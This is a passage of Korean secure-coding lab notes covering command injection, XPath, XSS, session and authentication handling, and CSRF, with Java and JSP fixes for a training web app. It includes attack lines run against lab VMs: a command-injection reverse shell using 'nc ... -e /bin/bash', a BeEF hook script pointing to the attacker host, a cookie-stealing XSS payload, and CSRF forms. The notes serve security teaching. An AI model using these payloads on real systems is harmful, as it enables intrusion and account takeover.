  			buffer.append("실행오류발생");
  			e.printStackTrace();
  		}
  		return buffer.toString();
  	}
  ```
  * test.jsp

  ```html
  <form action="command_test.do" id="form5">
  								<pre>
          (4) Command 인젝션  <br />
          <%--
          	내부 처리에 사용되는 명령어(type, dir)가 
          	사용자 화면에서 서버로 직접 전달되는 구조를 가지고 있음
          	-> 공격자가 내부 처리를 유추할 수 있다
          	=> 코드화한 값을 서버로 전달하도록 수정
          	   type = 0
          	   dir  = 1
           --%>
              <select name="data" id="data5">
                <%-- 
                <option value="type">--- show File1.txt ---</option>
                <option value="dir">--- show Dir ---</option>
                --%>
                <option value="0">--- show File1.txt ---</option>
                <option value="1">--- show Dir ---</option>
          </select> <input type="button" id="button5" value="실행">
         </pre>
  </form>
  ```

* nslookup 기능을 지원하는 사이트에서의 공격

  * @Kali#2 > 브라우저로 http://KALI#1/bWAPP (bee/bug) 접속
  * Choose your bug : OS Command Injection 선택 후 Hack 버튼 클릭
  * nslookup 서비스를 제공
    root@kali:~# cd /var/www/html/bWAPP/root@kali:/var/www/html/bWAPP# gedit commandi.php 
  * @Kali#2# nc -lvp 8282 ⇐ 8282 포트로 연결대기
  * @Kali#2OS Command Injection 페이지에서 아래 내용을 입력
    www.naver.com ; nc KALI#2_IP 8282 -e /bin/bash
    ⇐ KALI#2의 8282포트로 연결 후 /bin/bash을 실행
  * @Kali#2 터미널에서 쉘 명령어를 실행 → Kali#1에서 실행된 결과가 터미널에 출력
    ![img](https://lh3.googleusercontent.com/kO_JYbHhDNhJvI7faqGvDcE6EniTSiy_koPvxuaG9HAerhGQXHL9l66DlyGBz49TGHeOXGcLymgMJ4jQPefYiAyihK9a5uz2GmBVMsWFNHHtV-g3R1R9oAX-yuoDov7DMTy6Bnh3)



### XPath Injection

* XML문서에 사용되는 표현식

* XML문서에서 특정 입력 값을 찾기 위해서 XPath를 사용한다.

* 입력 값을 검증하지 않고 사용하거나, XQuery 구문을 사용하여 예방 할 수 있다.

* 실습

  * TestUtil.java open

  * 아래와 같이 코드 수정

    ```java
    // 입력 값 필터링 코드
    	// 안전한 방법은 아니지만 일부 문자를 필터링 할 수 있다.
    	public String xpathFilter(String input) {
    		return input.replaceAll("[',\\[]", "");	// ', [ 를 제거하는 코드
    	}
    
    	public String readXML(String name) {
    
    		StringBuffer buffer = new StringBuffer();
    
    		try {
    			InputStream is = this.getClass().getClassLoader().getResourceAsStream("config/address.xml");
    			DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
    			DocumentBuilder builder = builderFactory.newDocumentBuilder();
    			Document xmlDocument = builder.parse(is);
    			XPath xPath = XPathFactory.newInstance().newXPath();
    
    			System.out.println("ccard 출력");
    			String expression = "/addresses/address[@name='" + xpathFilter(name) + "']/ccard";
    
    			NodeList nodeList = (NodeList) xPath.compile(expression).evaluate(xmlDocument, XPathConstants.NODESET);
    			for (int i = 0; i < nodeList.getLength(); i++) {
    				buffer.append("CCARD[ " + i + " ]  " + nodeList.item(i).getTextContent() + "<br/>");
    			}
    ```

    

### LDAP Injection

* 취약점 제거 기법
  * LDAP 쿼리 조작할 수 있는 문자열을 제거.
  * 사용자 입력에 대해 엄격하게 유효성을 검증한다.



### SOAP Injection



## 세션 및 인증 관리 취약

* 인증 (Password)
  * 세션을 사용하는 인증
  
  * 인증 시도 횟수를 제한해야 한다.
    (제안 해제하는 방법도 안전해야 한다.)
    
  * 인증 정보를 생성 및 관리가 안전해야 한다. (암호 정책 수립 기준 설명서)
    
    * **Nist Password Guide Lines**
  * 복잡도
    * 비규칙성
    * 사전 등록되지 않은 (Password Dictionary)
    * 개인정보 관련
    
  * 패스워드 생성(설정) 정책
  
    * 1차. 회원가입에서 패스워드 입력
      2차. 서버에서 입력된 패스워드 암호화
      3차. 서버에서 암호화된 패스워드 DB에 저장
  
    * 클라이언트와 서버에 동일하게 적용되었는지 확인해야 한다.
  
    * LoginValidator.java
  
      ```java
      Public class LoginValidator implements Validator {
      @Override
      public void validate(Object target, Errors errors) {
      MemberModel memberModel = (MemberModel) target;
      
      // 사용자 ID가 입력되지 않은 경우 에러 처리
      if(memberModel.getUserId() == null ||
      // trim(): 좌우 공백 제거
      // isEmpty(): 
      memberModel.getUserId().trim().isEmpty()){
      errors.rejectValue("userId", "required");
      }
      
      //패스워드가 입력되지 않은 경우 에러 처리
      if(memberModel.getUserPw() == null ||
      memberModel.getUserPw().trim().isEmpty()){
      errors.rejectValue("userPw", "required");
      }
      
      // 사용자 명이 등록되어 있지 않은 경우 에러 처리
      if(memberModel.getUserName() == null ||
      memberModel.getUserName().trim().isEmpty()){
      errors.rejectValue("userName", "required");
      }
         
      		// 패스워드 복잡도 체크
      		if (!verify(loginModel.getUserPw())) {
      			errors.rejectValue("userPw", "password-weaked");
      		}
      
      	}
      	
      	public boolean verify(String pw) {
      		String pwPolicy = "(?=.*[a-zA-Z])(?=.*[!@#$%^*+=\\-])(?=.*[0-9]).{8,20}";
      		Pattern pattern = Pattern.compile(pwPolicy);
      		Matcher matcher = pattern.matcher(pw);
      		return matcher.matches();
      	}
      }
      ```
  
    * login.jsp
  
      ```jsp
      // /openeg/WebContent/WEB-INF/board/login.jsp
      	// 클라이언트 사이트에서 패스워드 복잡도 체크 로직 (244페이지)
      	function isValidFormPassword(pw) {
      		// 패스워드 길이 체크
      		if (pw.length < 8 || pw.length > 20) {
      			alert("비밀번호는 8~20 자리로 입력해 주세요.");
      			return false;
      		}
      		// 복잡도 체크
      		var check = /^(?=.*[a-zA-Z])(?=.*[!@#$%^*+=\-])(?=.*[0-9]).{8,20}$/;
      		if (!check.test(pw)) {
      			alert("비밀번호는 문자, 숫자, 특수문자의 조합으로 입력해 주세요.");
      			return false;
      		}
      		return true;
      	}
      	function check() {
      		var pw = document.getElementById("userPw").value;
      		return isValidFormPassword(pw);
      	}
      ```
  
  * 인증 시도 횟수 제한
  
    * 추가 값 입력 요구하여 무작위 대입 공격이 불가능 하도록 한다.
  
    * 계정을 잠금시켜 추가 인증을 통해 해제 하도록 한다.
  
    * LoginHistory.java
  
      ```java
      package kr.co.openeg.lab.login.model;
      
      public class LoginHistory {
      	private int idx;
      	private String userId;
      	private int retry;	
      	private int  loginFailedCount; // 로그인 실패 회수를 저장 
      	private long lastFailedLogin;
      	private long lastSucessedLogin;
      	private String clientIP;
      	private String sessionID;
      	
      	public int getLoginFailedCount() {
      		return loginFailedCount;
      	}
      	public void setLoginFailedCount(int loginFailedCount) {
      		this.loginFailedCount = loginFailedCount;
      	}
      	public int getIdx() {
      		return this.idx;
      	}
      	public void setIdx(int idx) {
      		this.idx = idx;
      	}
      	public String getUserId() {
      		return userId;
      	}
      	public void setUserId(String userId) {
      		this.userId = userId;
      	}
      	public int getRetry() {
      		return retry;
      	}
      	public void setRetry(int retry) {
      		this.retry = retry;
      	}
      	public long getLastFailedLogin() {
      		return lastFailedLogin;
      	}
      	public void setLastFailedLogin(long lastFailedLogin) {
      		this.lastFailedLogin = lastFailedLogin;
      	}
      	public long getLastSucessedLogin() {
      		return lastSucessedLogin;
      	}
      	public void setLastSucessedLogin(long lastSucessedLogin) {
      		this.lastSucessedLogin = lastSucessedLogin;
      	}
      	public String getClientIP() {
      		return clientIP;
      	}
      	public void setClientIP(String clientIP) {
      		this.clientIP = clientIP;
      	}
      	public String getSessionID() {
      		return sessionID;
      	}
      	public void setSessionID(String sessionID) {
      		this.sessionID = sessionID;
      	}	
      }
      ```
  
      
  
    * LoginController.java
  
      ```java
      package kr.co.openeg.lab.login.controller;
      
      import java.util.Date;
      
      import javax.annotation.Resource;
      import javax.servlet.http.HttpServletRequest;
      import javax.servlet.http.HttpSession;
      
      import kr.co.openeg.lab.login.model.LoginHistory;
      import kr.co.openeg.lab.login.model.LoginSessionModel;
      import kr.co.openeg.lab.login.service.LoginService;
      import kr.co.openeg.lab.login.service.LoginValidator;
      
      import org.springframework.stereotype.Controller;
      import org.springframework.validation.BindingResult;
      import org.springframework.web.bind.annotation.ModelAttribute;
      import org.springframework.web.bind.annotation.RequestMapping;
      import org.springframework.web.bind.annotation.RequestMethod;
      import org.springframework.web.servlet.ModelAndView;
      
      @Controller
      public class LoginController {
      
      	@Resource(name = "loginService")
      	private LoginService service;
      
      	@RequestMapping("/login.do")
      	public String login() {
      		return "/board/login";
      	}
      	@RequestMapping(value = "/login.do", method = RequestMethod.POST)
      	public ModelAndView loginProc(@ModelAttribute("LoginModel") LoginSessionModel loginModel, BindingResult result, HttpSession session, HttpServletRequest request) {
      		ModelAndView mav = new ModelAndView();
      
      		// 인증 시도 회수 제한을 구현
      		// 현재 세션에서 LoginVO라는 이름의 객체(LoginHistory)를 가져옮
      		LoginHistory loginVO = (LoginHistory)session.getAttribute("LoginVO");
      		if (loginVO == null) {
      			System.out.println("#1" + session.getId());
      			loginVO = new LoginHistory();
      		}
      		// form validation
      		new LoginValidator().validate(loginModel, result);
      		if (result.hasErrors()) {
      			mav.setViewName("/board/login");
      			return mav;
      		}
      		String userId = loginModel.getUserId();
      		String userPw = loginModel.getUserPw();
      		// 로그인 실패 회수를 체크해서 5회 이상이면 로그인 시도를 차단
      		long now = new Date().getTime();
      		long lastFailedLogin = loginVO.getLastFailedLogin();
      		int tryCount = loginVO.getLoginFailedCount();
      		tryCount ++;
      		if (tryCount >= 5) {
      			// 마지막으로 로그인에 실패한 후 10초가 경과하면 로그인 차단을 해제
      			if ((now - lastFailedLogin) > 10000) {
      				tryCount = 1;
      			} else {
      				loginVO.setLoginFailedCount(tryCount);
      				loginVO.setLastFailedLogin(now);
      				session.setAttribute("LoginVO", loginVO);
      				
      				mav.addObject("errCode", 10);
      				mav.setViewName("/board/login");
      				return mav;
      			}
      		}
      		LoginSessionModel loginCheckResult = service.checkUserId(userId, userPw);
      
      		// 로그인 실패
      		if (loginCheckResult == null) { 
      			// 로그인 실패 회수를 증가시킨 후 인증시도이력 정보를 세션에 저장
      			loginVO.setLoginFailedCount(tryCount);
      			// 마지막 로그인 실패 시간을 저장
      			loginVO.setLastFailedLogin(now);
      			session.setAttribute("LoginVO", loginVO);
      			
      			mav.addObject("userId", userId);
      			mav.addObject("errCode", 1);
      			mav.setViewName("/board/login");
      			return mav;
      		} 
      		// 로그인 성공
      		else { 
      			// 기존 세션을 지우고, 새로운 세션을 생성 ⇐ 세션 고정 공격을 방어하기 위한 방법
      			System.out.println("Current Session ID : " + session.getId());
      			session.invalidate();
      			session = request.getSession(true);
      			System.out.println("New Seesion ID : " + session.getId());
      			
      			session.setAttribute("userId", userId);
      			session.setAttribute("userName", loginCheckResult.getUserName());
      			mav.setViewName("redirect:/board/list.do");
      			return mav;
      		}
      	}
      	@RequestMapping("/logout.do")
      	public String logout(HttpSession session) {
      		session.invalidate();
      		return "redirect:login.do";
      	}
      }
      ```
  
      
  
  * 다중로그인 정책
  
    * 다중 로그인: 서로 다른 브라우저 or 여러 PC에서 동일한 계정으로 로그인하는 것
  
  * 오랫동안 사용하지 않는 제한
  
    * 일정 시간 동안 요청이 없을 때 세션을 유지하지 않고 파기하도록 한다.
    * 세션타임 아웃의 설정 적용 순서
      * 프로그램에 코딩된 세션타임 (session.setMaxIncactiveInterval(int))
      * 각 웹 어플리케이션 (WEB-INF/web.xml)
      * [tomcat설치디렉토리]/conf/web.xml
  
  * 모든 페이지에 로그아웃 버튼이나 링크가 노출되도록 한다.
  
    * 로그아웃을 하지 않으면 세션이 남기 때문에 로그아웃을 유도하기 위해서라도 모든 페이지에 로그아웃 버튼을 노출시킨다.
    * 사용자가 브라우저를 닫아도 서버에서는 연결을 완전히 끊는다는 것을 모르기 때문에 세션타임이 되기 전에는 세션을 유지할 수 있다.
  
* 인가
  * 화면
  * 기능
  * 데이터
* 세션
  * 쿠키를 이용해서 서버가 사용자의 접속을 이어주기 위한 기능 (= SessionID)
  * 세션을 구분하는 SessionID를 추측할 수 없도록 만든다
  * SID 스니핑을 통해 탈취 당할 수 있다.
    * 보안 통신(HTTPS)를 통해서 스니핑을 완화한다.
  * 서버에서 내려받은 클라이언트를 통해서 클라이언트에 저장된 SID를 탈취 당할 수 있다. (XSS을 통해서 탈취)
    * 시큐어코딩 기법을 통해서 공격자의 XSS 기법을 하지 못하도록 완화한다.
  * SessionID 고정
    * 인증 전에서 인증 후. 동일한 세션이 유지되는 것
      (Login ⇒ Logout 동일한 SID)
  * URL White에 사용되는 파라미터에서 SID를 추출할 수 있다.



##### Burp Suite (in WinXP)

* @WinXP > Burp Suite 실행 후 IE로 openeg 접속

* Burp Suite > Proxy > Options > 127.0.0.1:8080 선택 후 Edit 버튼을 클릭 
  \> Bind to port를 8082로 변경 후 OK 버튼 클릭

  \> Running 체크 박스를 토클해서 재 선택 > Interceptor 탭

  \>Interceptor is on 버튼을 클릭해서 Interceptor is off로 설정
  \> IE 브라우저에서 Proxy를 8082 선택 후 openeg로 접속

  > ![img](https://lh4.googleusercontent.com/nplbOj53QUvxEZddG-0W1TKFla25NspwTu5MpVonOypYnbZDCyuTYVhiNkCFR_8JMPbzNXd0xmWhntApQl8EYof-eDqW-4411cm_s4D5LPG-uai5Br3_rI9OxmEv1KFwESTqd54b)

  

  ![img](https://lh4.googleusercontent.com/YZ_H9A77dNFQG3720wiMqqAWiBjLSbPFYYJ8jMc6-dgh9PWysuAe9pEL6lw8FTMYtOyyT7Di7VDAwgJPS1Tf6yZb1u_V2WkGggZYQc_Z69FS_HAGuu9Zp6OYN_lwp7HoBeaYDdK8)![img](https://lh5.googleusercontent.com/ZU08Ttyyq_eVyrGTAtI0N_w_wHsCHQiLH7Z-zR2S-qCgiCWCwSax6TeVyiP9t7Leb0sSiYfsScyceF3DTVrJeYuDLtxpcWSXipVekfkHr9tyZzcdwR_hyHx8SzRFsUblMxBs_ps3)



##  크로스 사이트 스크립팅 (Cross-Site Scriptting, XSS)

* **공격자가 전달한 스크립트 코드**가 사용자 브라우저를 통해서 실행되는 것
  * 타겟 PC에 저장된 정보를 탈취
  * 가짜 페이지를 만들어서 타겟으로 하여금 추가 입력을 유도하고, 정보를 탈취한다.
  * 타겟 PC를 좀비화하여 원격으로 타겟 PC를 조작하게 된다. (BeEF)
* 공격자가 스크립트 코드를 전달하는 방식에 따라 유형이 달라진다.
* XSS Cheat Sheet
  https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
* Script 실행 방법
  * html 내부 Script 코드를 통한 실행
  * Script src를 통한 실행
  * img src onerror 이벤트를 통해 Script 실행
  * css의 express, url 함수 안에서 Script 실행
* **Lucy xss filter** - Naver에서 만든 Script 실행 방지 필터

### Reflective(반사) XSS

* 취약한 웹 서버를 경유해서 타겟에 전달되는 방식

* 입력 값이 입·출력 검증 없이 다음 화면에 사용되는 경우 발생.

* ex. 입력 값을 출력으로 보내다.
  <%=request.getParameter("input")%>
  <% out.print(request.getParameter("input")); %>

  정상 입출력: .../do.jsp?input=홍길동 ⇒ 홍길동
  비정상 입출력: .../do.jsp?input=\<script>alert(document.cookie)\</script> ⇒ 해당 브라우저의 쿠키 값 출력

  

### Stored(저장) XSS

* 취약한 웹 서버에 스크립트 코드를 저장하여 지속적으로 타겟 브라우저로 내려가서 실행 되는 것.
* 지속적인 공격이 가능하다. Persistence



###  DOM Based XSS

* 개발자가 작성한 스크립트 코드의 취약점을 이용한 공격

* 실행 가능한 스크립트 코드가 있는지 확인한다.

  * 실행해야 한다면 검증한 후 적용
  * 굳이 실행할 필요가 없다면 다른 방법으로 서비스 한다.

  

### CSP

* WEB은 기본적으로 **교차 자원 공유(Cross Resource Sharing)**가 가능한데, XHR을 사용하는 비동기 통신에서는 **동일 기원 정책(Same Origin Policy, SOP)**의 특성을 갖는다.
  SOP 특성으로 인해서 ??이 막힌다.
* **교차 기원 자원 공유 (Cross Origin Resource Sharing, CORS)** - SOP를 완화하기 위한 정책
* https://developer.mozilla.org/ko/docs/Web/HTTP/CSP
  https://content-security-policy.com/browser-test/



### Lucy Xss Filter Library

* Eclipse > TestController.java > testXss()

  ```java
  
  	@RequestMapping(value = "/test/xss_test.do", method = RequestMethod.POST)
  	@ResponseBody
  	public String testXss(HttpServletRequest request) {
  		StringBuffer buffer = new StringBuffer();
  		// 진단결과 : 
  		// 입력값을 아무런 검증없이 출력으로 반환 
  		// /test/xss_test.do?data=<script>...</script> 형식으로 호출되면
  		// <script>...</script>가 브라우저로 전달되는 구조
  		
  		// 방어대책 : 입력값을 HTML인코딩하여 출력값으로 반환
  		String data = request.getParameter("data");
  		if (data != null) {
  			data = data.replaceAll("<", "&lt;");
  			data = data.replaceAll(">", "&gt;");
  		}
  		buffer.append(data);
  		return buffer.toString();
  	}
  
  	@RequestMapping(value = "/test/xss_test.do", method = RequestMethod.POST)
  	@ResponseBody
  	public String testXss(HttpServletRequest request) {
  		StringBuffer buffer = new StringBuffer();
  		// 진단결과 : 
  		// 입력값을 아무런 검증없이 출력으로 반환 
  		// /test/xss_test.do?data=<script>...</script> 형식으로 호출되면
  		// <script>...</script>가 브라우저로 전달되는 구조
  		
  		// 방어대책 : 입력값을 HTML인코딩하여 출력값으로 반환
  		String data = request.getParameter("data");
  //		// 방법1. 모든 태그에 대해서 일괄되게 HTML 인코딩을 적용
  //		if (data != null) {
  //			data = data.replaceAll("<", "&lt;");
  //			data = data.replaceAll(">", "&gt;");
  //		}
  		// 방법2. lucy와 같은 검증된 필터 라이브러리를 사용
  		// jar 파일을 프로젝트 라이브러리에 등록
  		// c:\FullstackLAB\download\lucy-xss-filter\lucy-xss-1.1.2.jar
  		// openeg > WebContent > WEB-INF > lib
  		
  		// xml 파일(rule set)을 소스 디렉터리에 복사
  		// c:\FullstackLAB\download\lucy-xss-filter\lucy-xss-superset.xml
  		// openeg > Java Resoures > src
  		
  		// 인스턴스 생성 후 필터링
  		XssFilter filter = XssFilter.getInstance("lucy-xss-superset.xml");
  		data = filter.doFilter(data);
  		
  		buffer.append(data);
  		return buffer.toString();
  	}
  ```

* Eclipse > BoardController.java > boardWriteProc()

  ```java
  @RequestMapping(value = "/write.do", method = RequestMethod.POST)
  	public String boardWriteProc(@ModelAttribute("BoardModel") BoardModel boardModel, MultipartHttpServletRequest request, HttpSession session) {
  		String uploadPath = session.getServletContext().getRealPath("/") + "files/";
  		File dir = new File(uploadPath);
  		if (!dir.exists()) {
  			dir.mkdir();
  		}
  
  		MultipartFile file = request.getFile("file");
  		if (file != null && !"".equals(file.getOriginalFilename())) {
  			String fileName = file.getOriginalFilename();
  			File uploadFile = new File(uploadPath + fileName);
  			if (uploadFile.exists()) {
  				fileName = new Date().getTime() + fileName;
  				uploadFile = new File(uploadPath + fileName);
  			}
  
  			try {
  				file.transferTo(uploadFile);
  			} catch (Exception e) {
  				System.out.println("upload error");
  			}
  						
  			boardModel.setFileName(fileName);
  		}
  
  		// 진단! Stored XSS 취약점을 가지고 있다!
  		// 클라이언트에서 전달된 게시판의 내용에 실행 가능한 스크립트 코드 포함 여부를 확인하지 않고 DB에 저장하고 있다.
  		// DB에 저장된 스크립트 코드가 지속적으로 사용자 브라우저로 전달되어 실행되게 됨.
  		
  		// 대응!
  		// 게시판 내용의 실행 가능한 스크립트를 HTML 인코딩에서 DB에 저장하도록 수정한다.
  		
  		// 게시판 내용 추출
  		String c = boardModel.getContent();
  		XssFilter filter = XssFilter.getInstance("lucy-xss-superset.xml");
  		c = filter.doFilter(c);
  		boardModel.setContent(c);
  
  		String content = boardModel.getContent().replaceAll("\r\n", "<br />");
  		boardModel.setContent(content);
  		service.writeArticle(boardModel);
  
  		return "redirect:list.do";
  	}
  ```

* 게시판 보기를 처리하는 컨트롤러에서 게시판 내용 부분을 lucy를 이용하여 HTML 인코딩 처리Eclipse > BoardController.java > boardView()

  ```java
  @RequestMapping("/view.do")
  	public ModelAndView boardView(HttpServletRequest request) {
  		int idx = Integer.parseInt(request.getParameter("idx"));
  		// DB에서 읽어온 게시판 정보가 Board라는 객체에 저장
  		BoardModel board = service.getOneArticle(idx);
  		
  		// board 객체에서 게시판 내용을 추출하여 lucy를 이용한 html 인코딩 후 다시 board 객체에 저장
  		String content = board.getContent();
  		XssFilter filter = XssFilter.getInstance("lucy-xss-superset.xml");
  		content = filter.doFilter(content);
  		board.setContent(content);
        // 일반적으로 출력해 주는 부분에서 Filtering 한다.
        
        service.updateHitcount(board.getHitcount() + 1, idx);
  
  		List<BoardCommentModel> commentList = service.getCommentList(idx);
  
  		ModelAndView mav = new ModelAndView();
  		mav.addObject("board", board);
  		mav.addObject("commentList", commentList);
  		mav.setViewName("/board/view");
  		return mav;
  	}
  ```

* 입력, 불러오는 부분에서 필터링 하는 것 보다 출력되는 부분에서 필터링 하여보자.
  openeg/WebContent/WEB-INF/board/view.jsp

  ```jsp
  <%-- 101라인쯤 --%>
  <%-- ${board.content} --%>
  <c:out value="${board.content}" escapeXml="true"/>
  <%-- 기본적으로 escapeXml은 true값을 가진다. --%>
  ```

#### BeEF

* XSS 방어 코드를 모드 해제한 후
  BoardController.java > boardWriteProc, boardView view.jsp > ${board.content}
* @Kali#2 > 즐겨찾기 > BeEF 선택 > 브라우저가 열리고 BeEF 관리자 콘솔창이 실행 (beef / beef)![img](https://lh4.googleusercontent.com/zOKJTp0vDnqvcoy2ySLIN9OC8_SSgb2XRYy6autEMb5iMoTUg8IY0ygalv6wJCLz3F6O8t1l0FY9k5N8L2BeBHNOfdnSVOvg2-ATzGBUg6QGQNSa0Na7pfaYZg3sE5lhsbf2Q2GC)
* @WinXP (Proxy 해제 후) > FireFox 실행 후 http://KALI#2_IP:3000/hook.js 로 접속
* openeg > 게시판 글쓰기에서 아래의 내용을 입력
  \<script src="http://KALI#2_IP:3000/hook.js">\</script>



* 실습

  * Eclipse > openeg > WebContent > 마우스 오른쪽 클릭 > New > HTML File > xss.html

  * [http://localhost:8080/openeg/xss.html?message=Hello%20World](http://localhost:8080/openeg/xss.html?message=Hello World) ⇒ Hello World 가 화면에 출력
    [http://localhost:8080/openeg/xss.html?message=Hello%20Worldalert(document.cookie)](http://localhost:8080/openeg/xss.html?message=Hello Worldalert(document.cookie))

    ```html
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="EUC-KR">
    <title>Insert title here</title>
    </head>
    <body>
    	<script>
    		function onClickString2() {
    			var a = document.URL;
    			a = unescape(a);
    			a = a.substring(a.indexOf("message=")+8, a.length);
    			var regex = /^([a-zA-Z0-9+\s])*$/;
    			if (regex.test(a)) {
    				document.write(a);
    			}
    		}
    		
    		function onClickString() {
    			var a = document.URL;
    			a = unescape(a);
    			a = a.substring(a.indexOf("message=")+8, a.length);
    			a = sanitize(a);
    			document.write(a);			
    		}
    		
    		function sanitize(str) {
    			var d = document.createElement("div");
    			d.appendChild(document.createTextNode(str));
    			return d.innerHTML;
    		}
    	</script>
    	<div onclick="onClickString()">
    		전달된 파라미터의 값을 확인하려면 여기를 클릭하세요.
    	</div>
    
    </body>
    </html>
    ```

    

### 크로스 사이트 요청 위조 (CSRF)

* 서버로 전달된 요청을 절차와 주체를 검증하지 않고 처리했을 때 발생한다.

* 공격자가 심어 높은 코드를 통한 자동화된 요청이 희생자의 권한으로 실행된다.

  * 패스워드 변경

    | 패스워드 변경 신청 폼                      | 패스워드 변경 처리                                        |
    | ------------------------------------------ | --------------------------------------------------------- |
    | changePwForm.jsp                           | changePwProc.jsp                                          |
    | New PW: ____                               | #1 인증(로그인) 여부를 판단                               |
    | confirm PW: ____                           | #2 변경에 필요한 정보(New PW)<br />가 포함되어있는지 확인 |
    |                                            | #3 세션 ⇒ 사용자 정보(user Id)                            |
    | <input type="hidden" value="" /> 토큰 검증 | #4 Update userId PW ← New PW                              |

  * 로그인한 사용자만 볼 수 있는 회원제 게시판에 자동 요청 코드를 삽입

    ```html
    <iframe src="changePwProc.jsp?newPW=123" width="0" height="0">
    ```

  * 방어 대책

    * 요청 절차를 확인
      * Referer 요청 헤더를 검증
      * Token 검증
      * CAPTCHA reCAPTCHA검증
        (= 자동화된 요청을 방지 = 사용자와의 상호작용을 통한 요청 처리)
    * 요청 주체를 확인한다.
      * 주요 기능에 대해서 재인증, 재인가 후 처리한다.
        * 정보가 생성, 수정, 삭제되는 경우(=트랜젝션이 발생)
        * 중요 정보를 다루는 기능
        * 과금이 발생하는 기능

* [실습] 게시판 자동 글쓰기

  * 자동 글쓰기 코드

  ```html
  <form action="write.do" method="post" enctype="multipart/form-data">
  <input type="text" name="subject" value="저렴한 대출상품 안내"/> 
  <input type="hidden" name="writer" value="관리자" /> 
  <input type="hidden" name="writerId" value="admin" />
  <textarea name="content">무담보 대출 상품 안내 연락주세요...</textarea>
  <input type="submit" value="확인" id="btnSubmit" />
  </center>
  </form>
  
  <script>document.getElementById("btnSubmit").click();</script>
  ```

  * 위 스크립트가 실행되는 이유

    * 스크립트 코드 실행에 대해 검증하지 않고 있다.
    * write.do 요청을 받은 서버는 검증 없이 DB에 값을 넣는다.

  * 해결 기법 (글쓰기: GET방식, write.do)

    * 임의 값(토큰) 생성

    * 세션에 저장(sToken) → 글쓰기 화면(write.jsp)

    * 위에서 생성한 토큰을 히든 필드의 값으로 설정

    * POST 방식으로 write.do에서 요청 파라미터로 온 토큰(pToken)과 세션에 저장된 토큰을 비교

    * 일치: 글 저장 / 불일치: list 페이지로 리다이렉트

    * Eclipse > BoardController.java > boardWrite()

      ```java
      //  글쓰기 화면(페이지)을 요청받으면 글쓰기 화면을 반환
      	@RequestMapping("/write.do")
      	public String boardWrite(@ModelAttribute("BoardModel") BoardModel boardModel, HttpSession session) {
      		// 임의의 토큰을 생성한 후 세션에 저장
      		String token = UUID.randomUUID().toString();
      		session.setAttribute("stoken", token);
      		
      		return "/board/write";
      	}
      ```

      write.jsp

      ```jsp
      <form action="write.do" method="post" onsubmit="return writeFormCheck()" enctype="multipart/form-data">
      <%-- 
      	서버에서 생성 후 세션에 저장해 둔 토큰값을 히든 필드의 값으로 설정
      --%>
      <input type="hidden" name="ptoken" value="${stoken}" />
      
      ```

      BoardController.java > boardWriteProc()

      ```java
      @RequestMapping(value = "/write.do", method = RequestMethod.POST)
      	public String boardWriteProc(@ModelAttribute("BoardModel") BoardModel boardModel, MultipartHttpServletRequest request, HttpSession session) {
      		
      		// 파라미터로 전달된 토큰값과 세션에 저장된 토큰값을 비교하여
      		// 일치하는 경우에는 게시물을 저장하고, 
      		// 일치하지 않는 경우에는 list.do로 리다이렉트 한다.
      		String sToken = (String)session.getAttribute("stoken");
      		String pToken = request.getParameter("ptoken");
      		if (pToken == null || !pToken.equals(sToken)) {
      			return "redirect:list.do";
      		}
      		
      		String uploadPath = session.getServletContext().getRealPath("/") + "files/";
      		File dir = new File(uploadPath);
      		if (!dir.exists()) {
      			dir.mkdir();
      		}
      
      		MultipartFile file = request.getFile("file");
      		if (file != null && !"".equals(file.getOriginalFilename())) {
      			String fileName = file.getOriginalFilename();
      			File uploadFile = new File(uploadPath + fileName);
      			if (uploadFile.exists()) {
      				fileName = new Date().getTime() + fileName;
      				uploadFile = new File(uploadPath + fileName);
      			}
      
      			try {
      				file.transferTo(uploadFile);
      			} catch (Exception e) {
      				System.out.println("upload error");
      			}
      						
      			boardModel.setFileName(fileName);
      		}
      
      		// 진단 
      		// 클라이언트에서 전달된 게시판 내용에 
      		// 실행 가능한 스크립트 코드 포함 여부를 확인하지 않고
      		// DB에 저장하고 있음 
      		// --> DB에 저장된 스크립트 코드가 지속적으로 사용자 브라우저로 
      		//     전달되어 실행되게 됨 
      		// ==> Stored XSS 취약점을 가지고 있다.
      		
      		// 대응
      		// 클라이언트에서 전달된 게시판 내용에 포함된 
      		// 실행 가능한 스크립트를 HTML 인코딩한 후 DB에 저장하도록 수정.
      		
      		// 게시판 내용을 추출
      //		String c = boardModel.getContent();
      //		XssFilter filter = XssFilter.getInstance("lucy-xss-superset.xml");
      //		c = filter.doFilter(c);
      //		boardModel.setContent(c);		
      		
      		
      		String content = boardModel.getContent().replaceAll("\r\n", "<br />");
      		boardModel.setContent(content);
      		service.writeArticle(boardModel);
      
      		return "redirect:list.do";
      	}
      ```

* 파일 업로드 취약점

  * 업로드 파일의 크기와 종류를 제한하지 않는 경우
    * 의 디스크 자원 or 연결 자원을 고갈 시켜 서비스 거부 공격(DoS)에 사용될 수 있다.
    * 서버에서 실행될 수 있는 파일(SSS, WebShell)을 업로드해서 실행하여 서버의 제어권을 탈취할 수 있다.
    * 클라이언트에서 실행될 수 있는 악성 코드가 포함된 파일을 업로드하여 악성 코드 유포지로 악용될 수 있다.
  * 업로드한 파일을 외부에서 접근 가능한 경로에 저장하는 경우
    * WebRoot 아래 파일이 저장되는 경우
  * 방어기법
    * 파일 크기 제한
    * 파일 종류 제한
      * 확장자 비교
    * 파일을 외부에서 접근할 수 없는 경로에 저장
    * 파일의 저장 경로와 파일 명을 외부에서 알 수 없도록 변경하여 사용
    * 파일의 실행 속성을 제거하고 저장.

* 파일 다운로드 취약점





###### 회사에서 바로 통하는 엑셀 ebook

http://hanbit.smilecdn.com/ebook/ebook_excel.pdf





